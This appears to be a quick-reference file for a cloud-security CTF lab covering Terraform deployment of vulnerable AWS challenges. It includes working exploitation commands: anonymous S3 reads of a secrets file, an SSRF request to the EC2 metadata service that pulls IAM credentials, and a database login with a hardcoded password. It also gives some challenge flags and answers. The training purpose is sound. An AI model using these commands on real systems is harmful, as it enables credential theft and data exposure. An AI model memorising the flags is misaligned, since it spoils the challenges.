# Quick Reference Guide

## Common Commands

### AWS CLI

```bash
# Verify AWS credentials
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]'

# List Lambda functions
aws lambda list-functions

# List RDS instances
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,DBInstanceStatus]'

# View CloudTrail logs
aws cloudtrail lookup-events --max-results 10

# Get current region
aws configure get region

# Set region
export AWS_REGION=us-east-1
```

### Terraform

```bash
# Initialize Terraform
terraform init

# Validate configuration
terraform validate

# Format code
terraform fmt -recursive

# Plan deployment
terraform plan

# Apply deployment
terraform apply

# Destroy resources
terraform destroy

# View outputs
terraform output

# View specific output
terraform output -raw bucket_name

# Refresh state
terraform refresh

# Show state
terraform show
```

### Challenge Deployment

```bash
# Deploy Challenge 01
cd challenges/01-misconfigured-s3/terraform
terraform init && terraform apply

# Deploy all challenges
for dir in challenges/*/terraform; do
  cd "$dir"
  terraform init && terraform apply -auto-approve
  cd ../../..
done

# Destroy Challenge 01
cd challenges/01-misconfigured-s3/terraform
terraform destroy

# Destroy all challenges
for dir in challenges/*/terraform; do
  cd "$dir"
  terraform destroy -auto-approve
  cd ../../..
done
```

### Challenge Exploitation

```bash
# Challenge 01: List S3 bucket contents
aws s3 ls s3://<bucket-name> --recursive --no-sign-request

# Challenge 01: Read S3 object
aws s3 cp s3://<bucket-name>/path/to/file - --no-sign-request

# Challenge 03: Query EC2 metadata
curl http://<instance-ip>:8080/?url=http://169.254.169.254/latest/meta-data/

# Challenge 04: Get Lambda function config
aws lambda get-function-configuration --function-name <name>

# Challenge 05: Call Lambda function
curl -X POST <lambda-url> -d '{"expression":"1+1"}'

# Challenge 06: Connect to RDS
mysql -h <endpoint> -u admin -p<password> appdb
```

---

## Workflow Examples

### Complete Challenge 01

```bash
# 1. Deploy
cd challenges/01-misconfigured-s3/terraform
terraform init
terraform apply

# 2. Get bucket name
BUCKET=$(terraform output -raw bucket_name)

# 3. Exploit
aws s3 ls s3://$BUCKET --recursive --no-sign-request
aws s3 cp s3://$BUCKET/internal/config/app-secrets.json - --no-sign-request

# 4. Find flag
# Flag: CTF{public_s3_data_exfil_success}

# 5. Cleanup
terraform destroy
```

### Complete Challenge 03

```bash
# 1. Deploy
cd challenges/03-ec2-metadata/terraform
terraform init
terraform apply

# 2. Get instance IP
IP=$(terraform output -raw instance_public_ip)

# 3. Wait for instance to boot
sleep 120

# 4. Exploit via SSRF
curl "http://$IP:8080/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 5. Get credentials
curl "http://$IP:8080/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ctf-03-ec2-role-*"

# 6. Cleanup
terraform destroy
```

### Complete Challenge 06

```bash
# 1. Deploy
cd challenges/06-public-rds/terraform
terraform init
terraform apply

# 2. Get RDS endpoint
ENDPOINT=$(terraform output -raw rds_endpoint)

# 3. Wait for RDS to be ready
sleep 300

# 4. Connect to database
mysql -h $ENDPOINT -u admin -p'Ctf_Passw0rd_2024!' appdb

# 5. Query for flag
SELECT * FROM app_secrets WHERE key_name='flag';

# 6. Cleanup
terraform destroy
```

---

## Debugging

### Check Terraform State

```bash
# Show all resources
terraform show

# Show specific resource
terraform state show aws_s3_bucket.vulnerable

# List all resources
terraform state list
```

### View AWS Resources

```bash
# List all S3 buckets
aws s3 ls

# List all EC2 instances
aws ec2 describe-instances

# List all Lambda functions
aws lambda list-functions

# List all RDS instances
aws rds describe-db-instances

# List all IAM users
aws iam list-users

# List all IAM roles
aws iam list-roles
```

### Check Logs

```bash
# View CloudTrail events
aws cloudtrail lookup-events --max-results 50

# View CloudTrail events for specific service
aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceType,AttributeValue=AWS::S3::Bucket

# View EC2 system log
aws ec2 get-console-output --instance-id <instance-id>
```

---

## Environment Variables

```bash
# Set AWS region
export AWS_REGION=us-east-1

# Set AWS profile
export AWS_PROFILE=ctf-user

# Set Terraform variables
export TF_VAR_region=us-east-1

# Disable Terraform color output
export TF_LOG_PATH=/tmp/terraform.log
export TF_LOG=DEBUG
```

---

## File Locations

```
cloud-security-ctf/
├── README.md                    # Main documentation
├── SETUP.md                     # Setup instructions
├── FAQ.md                       # Frequently asked questions
├── CONTRIBUTING.md              # Contribution guidelines
├── IMPROVEMENTS.md              # Infrastructure improvements
├── QUICK_REFERENCE.md           # This file
├── .gitignore                   # Git ignore rules
├── challenges/
│   ├── 01-misconfigured-s3/
│   │   ├── terraform/
│   │   │   ├── main.tf
│   │   │   ├── variables.tf
│   │   │   ├── outputs.tf
│   │   │   └── versions.tf
│   │   └── writeup/
│   │       └── README.md
│   ├── 02-overprivileged-iam/
│   ├── 03-ec2-metadata/
│   ├── 04-secrets-in-env/
│   ├── 05-insecure-lambda/
│   └── 06-public-rds/
└── docs/
    └── aws-security-resources.md
```

---

## Tips & Tricks

### Speed Up Deployment

```bash
# Use auto-approve to skip confirmation
terraform apply -auto-approve

# Parallelize resource creation
terraform apply -parallelism=10
```

### Save Outputs to File

```bash
# Save all outputs
terraform output > outputs.txt

# Save specific output
terraform output -raw bucket_name > bucket.txt
```

### Batch Operations

```bash
# Deploy all challenges
for i in {01..06}; do
  cd challenges/$i-*/terraform
  terraform init && terraform apply -auto-approve
  cd ../../..
done

# Destroy all challenges
for i in {01..06}; do
  cd challenges/$i-*/terraform
  terraform destroy -auto-approve
  cd ../../..
done
```

### Monitor Costs

```bash
# Get current month costs
aws ce get-cost-and-usage \
  --time-period Start=2024-01-01,End=2024-01-31 \
  --granularity MONTHLY \
  --metrics BlendedCost
```

---

## Useful Links

- [AWS CLI Documentation](https://docs.aws.amazon.com/cli/)
- [Terraform Documentation](https://www.terraform.io/docs)
- [AWS Security Best Practices](https://aws.amazon.com/architecture/security-identity-compliance/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [AWS Pricing Calculator](https://calculator.aws/)

---

## Need Help?

1. Check `FAQ.md` for common questions
2. Review `SETUP.md` for setup issues
3. Check challenge `writeup/README.md` for exploitation help
4. Review `CONTRIBUTING.md` if you want to contribute
5. Open an issue on GitHub

Happy hacking! 🎯
